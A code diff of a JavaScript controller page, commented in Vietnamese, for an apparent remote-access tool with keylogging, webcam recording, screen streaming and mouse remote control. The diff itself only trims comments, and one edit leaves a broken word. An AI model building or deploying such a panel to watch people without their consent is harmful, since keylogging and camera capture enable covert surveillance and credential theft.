@@ -3,7 +3,7 @@ const discoveredIPs = new Set();
 let isKeylogging = false;
 let isCamRecording = false;
 let lastRecordingName = "";
-// Biến cho Remote Control
+
 let isRemoteControlActive = false;
 let lastMoveTime = 0; 
 const MOUSE_THROTTLE_MS = 50; // Giới hạn gửi gói tin chuột (50ms/lần)
@@ -141,19 +141,17 @@ document.addEventListener('DOMContentLoaded', (event) => {
         actionCell.appendChild(btn);
     });
 
-    // --- [QUAN TRỌNG] KHỞI TẠO EVENT LISTENERS CHO REMOTE CONTROL ---
-    // Gọi hàm này 1 lần duy nhất khi trang load để gắn sự kiện
+    // --- KHỞI TẠO EVENT LISTENERS CHO REMOTE CONTROL ---
     initRemoteControlListeners();
 });
 
-// --- [MỚI] TỰ ĐỘNG NGẮT KẾT NỐI KHI REFRESH / ĐÓNG TAB ---
+// ---Ự ĐỘNG NGẮT KẾT NỐI KHI REFRESH / ĐÓNG TAB ---
 window.addEventListener('beforeunload', function (e) {
     // Gửi lệnh tắt các tính năng tốn tài nguyên
     if(socket && socket.connected) {
         socket.emit('send_command', { cmd: 'CMD_CLOSE_SCREEN' });
         socket.emit('send_command', { cmd: 'CMD_CLOSE_CAM' });
         
-        // Ngắt kết nối socket
         socket.disconnect();
     }
 });
@@ -176,7 +174,7 @@ function sendCommand(cmd) {
     }
 }
 
-// --- [MỚI] HÀM BẮT ĐẦU STREAM VÀ HIỆN NÚT REMOTE ---
+// ---HÀM BẮT ĐẦU STREAM VÀ HIỆN NÚT REMOTE ---
 function startScreenStream() {
     // Đảm bảo nút Record Webcam biến mất khi chuyển sang Screen
     const btnRecord = document.getElementById('btnRecordCam');
@@ -400,7 +398,7 @@ function confirmAction(cmd) {
 }
 
 
-// --- [TỐI ƯU HÓA] LOGIC REMOTE CONTROL ---
+// --- LOGIC REMOTE CONTROL ---
 
 // Hàm Bật/Tắt Remote Control
 function toggleRemoteControl() {
@@ -411,7 +409,7 @@ function toggleRemoteControl() {
     isRemoteControlActive = !isRemoteControlActive;
 
     if (isRemoteControlActive) {
-        // TRẠNG THÁI: BẬT
+
         if(btn) {
             btn.classList.remove('btn-outline-primary');
             btn.classList.add('btn-primary'); 
